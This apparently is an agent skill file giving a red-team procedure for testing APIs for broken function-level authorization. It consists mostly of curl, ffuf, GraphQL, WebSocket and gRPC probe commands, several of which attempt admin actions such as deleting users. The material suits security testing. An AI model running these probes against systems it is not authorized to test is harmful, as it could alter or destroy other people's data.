---
name: hunt-broken-function-level-auth
description: Hunt broken function-level authorization via verb drift, route shadowing, and transport gaps.
category: redteam
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, ffuf
metadata:
  tags: [redteam, authorization, function-level, API, verb-drift, route-shadowing]
  category: redteam
  related_skills:
    - hunt-idor
    - hunt-auth-bypass
    - hunt-api-misconfig
---

# Broken Function Level Authorization

Hunt for endpoints where authorization is enforced at the controller/middleware level but bypassed through HTTP verb drift, legacy routes, shadow endpoints, or transport protocol inconsistencies. Unlike IDOR (object-level), this targets ACTION-level authorization — can a user invoke admin functions despite lacking the admin role.

## When to Use

- API has distinct user roles (admin, moderator, user) but role checks are per-controller, not per-method.
- Legacy or deprecated endpoints still served behind updated middleware.
- GraphQL, gRPC, and WebSocket transports exist alongside REST APIs without authorization parity.
- Feature flags or beta endpoints expose functionality before security review.
- Batch/job endpoints accept internal requests without role verification.

## Quick Detection

```bash
# Verb drift: try PUT/DELETE on endpoints that return 403 on GET
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl -sk -X "$method" "https://target.com/api/admin/users" -w "$method %{http_code}\n" -o /dev/null
done
```

## Procedure

### Phase 1 — HTTP Verb Drift

```bash
# Admin endpoints — each HTTP method may have different auth
ENDPOINTS=(
  "/api/admin/users"
  "/api/admin/settings"
  "/api/manage/orders"
  "/api/internal/config"
)

for ep in "${ENDPOINTS[@]}"; do
  for method in GET POST PUT PATCH DELETE; do
    curl -sk -X "$method" "https://target.com$ep" \
      -w "$method $ep — %{http_code}\n" -o /dev/null
  done
  # Also try custom methods
  curl -sk -X "PURGE" "https://target.com$ep" -o /dev/null -w "PURGE — %{http_code}\n"
  curl -sk -X "DEBUG" "https://target.com$ep" -o /dev/null -w "DEBUG — %{http_code}\n"
done
```

### Phase 2 — Route Shadowing

```bash
# Legacy routes that bypass modern middleware
for path in "/api/v0/" "/api/v1/" "/api/legacy/" "/api/internal/" "/api/beta/" \
            "/api/mobile/" "/api/partner/" "/api/integration/" "/api/webhook/"; do
  curl -sk "https://target.com${path}users" -w "%{http_code} — $path\n" -o /dev/null
done

# ffuf for route discovery
ffuf -u "https://target.com/api/FUZZ/users" \
  -w /path/to/prefixes.txt \
  -mc 200,301,401,403
```

### Phase 3 — Feature Flag Bypass

```bash
# Beta/preview endpoints often lack authorization
for flag in "beta" "preview" "canary" "experimental" "new" "v2" "preview"; do
  curl -sk "https://target.com/api/${flag}/admin" -w "%{http_code} — $flag\n" -o /dev/null
done

# Feature flags in headers or cookies
curl -sk "https://target.com/api/admin/users" \
  -H "X-Feature-Flags: admin" \
  -H "X-Experimental: true" \
  -H "X-Beta-Access: 1"
```

### Phase 4 — Batch & Job Endpoints

```bash
# Batch operations may skip per-item authorization
curl -sk -X POST "https://target.com/api/batch" \
  -H "Content-Type: application/json" \
  -d '{"operations":[{"method":"DELETE","path":"/users/1"},{"method":"GET","path":"/admin/logs"}]}'

# Background job endpoints
for path in "/api/jobs" "/api/tasks" "/api/cron" "/api/queue" "/api/workers"; do
  curl -sk "https://target.com${path}/admin-cleanup" -w "%{http_code} — $path\n" -o /dev/null
done
```

### Phase 5 — Transport Protocol Inconsistency

```bash
# GraphQL — check if mutations allow admin actions without role check
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'

# WebSocket — actions sent over WS may skip REST middleware
# Test via wscat
echo '{"type":"DELETE_USER","payload":{"userId":1}}' | wscat -c "wss://target.com/ws"

# gRPC — reflection may expose admin methods
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 admin.UserService/DeleteUser
```

### Phase 6 — Content-Type Middleware Gaps

```bash
# Different content types may hit different parsers/middleware
curl -sk "https://target.com/api/admin/users" \
  -H "Accept: application/xml" \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name></user>'

curl -sk "https://target.com/api/admin/users" \
  -H "Content-Type: multipart/form-data" \
  -F "name=test"
```

## Pitfalls

- **405 Method Not Allowed ≠ no auth.** The method must exist AND lack authorization to be a finding.
- **Route shadowing requires the shadow endpoint to accept authenticated requests.** A public user-info endpoint is not a finding.
- **GraphQL `deleteUser` on a consumer-facing mutation is an IDOR, not BFLA.** BFLA is about action-level privileges, not object ownership.
- **WebSocket authorization bypass requires proof that the WS handler skips REST middleware checks.** Compare WS vs REST for the same action.

## Verification

1. A lower-privilege user invokes an admin-only action via an unguarded HTTP method, shadow route, or transport protocol.
2. The action succeeds (not just returns a different error — actually performs the operation).
3. The same action via the standard path (REST GET/POST) correctly returns 403.
4. Document the specific method, endpoint, and transport protocol that bypasses authorization.

## Related Skills

- **`hunt-idor`** — Object-level authorization (accessing other users' data).
- **`hunt-auth-bypass`** — Complete authentication bypass patterns.
- **`hunt-api-misconfig`** — API-level misconfigurations including transport gaps.
